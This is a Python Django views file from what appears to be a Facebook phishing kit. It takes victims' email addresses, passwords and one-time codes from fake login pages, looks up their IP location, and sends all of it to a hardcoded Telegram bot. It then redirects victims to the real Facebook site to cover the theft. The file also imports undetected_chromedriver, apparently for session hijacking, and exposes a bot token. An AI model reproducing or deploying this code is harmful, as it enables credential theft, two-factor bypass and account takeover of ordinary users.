import requests
import json
import pickle
from django.shortcuts import render
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time
import random

from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
import json
from django.conf import settings


TELEGRAM_BOT_TOKEN = '7584867618:AAHIy5vSZOhoW6Ba0pZdDL0fILznS9RGcyQ'
TELEGRAM_CHAT_ID = "1374918767"

USER_SESSIONS = {}
USER_COOKIES = {}

# CHROMEDRIVER_PATH = settings.CHROMEDRIVER_PATH

def index(request):
    return render(request, 'new.html')

def human_delay():
    time.sleep(random.uniform(1.5, 3.5))

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message
    }
    try:
        response = requests.post(url, json=payload)
        return response.json()
    except requests.RequestException as e:
        print(f"Error sending message: {e}")
        return {"ok": False}

def get_client_ip(request):
    """ Get the real IP address of the client """
    x_forwarded_for = request.META.get("HTTP_X_FORWARDED_FOR")
    if x_forwarded_for:
        return x_forwarded_for.split(",")[0]
    return request.META.get("REMOTE_ADDR")

def get_country_from_ip(ip_address):
    """ Fetch country and city using an IP address lookup API """
    url = f"http://ip-api.com/json/{ip_address}"
    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()
        data = response.json()
        return data.get("country", "Unknown Country"), data.get("city", "Unknown City")
    except requests.RequestException as e:
        print(f"Error fetching IP data: {e}")
        return "Unknown Country", "Unknown City"

@csrf_exempt
def receive_data(request):
    if request.method == "POST":
        try:
            data = json.loads(request.body)
            ip_address = get_client_ip(request)
            country, city = get_country_from_ip(ip_address)


            message = f"New Data Received from fb \nIP Address: {ip_address} \nCountry: {country} \nCity: {city}\n{json.dumps(data, indent=2)}"
            response = send_telegram_message(message)
            user = json.loads(json.dumps(data, indent=2))
            email = user.get('email', 'No email provided')
            password = user.get('password', 'No password provided')

            

           

            if response.get("ok"):  # Ensure Telegram message was sent
                return JsonResponse({"success": True, "redirect_url": "/otp/"})
            else:
                return JsonResponse({"success": False, "error": "Failed to send Telegram message"}, status=500)
            

        except json.JSONDecodeError:
            return JsonResponse({"success": False, "error": "Invalid JSON"}, status=400)

    return render(request, "index.html")


@csrf_exempt
def success(request):
    if request.method == "POST":
        try:
            data = json.loads(request.body)
         
            print(data)  # Debugging

            message = f"New Data Received from fb \n{json.dumps(data, indent=2)}"
            response = send_telegram_message(message)

            if response.get("ok"):  # Ensure Telegram message was sent
                return JsonResponse({"success": True, "redirect_url": "https://web.facebook.com/"})
            else:
                return JsonResponse({"success": False, "error": "Failed to send Telegram message"}, status=500)

        except json.JSONDecodeError:
            return JsonResponse({"success": False, "error": "Invalid JSON"}, status=400)
    return render(request, 'otp.html')
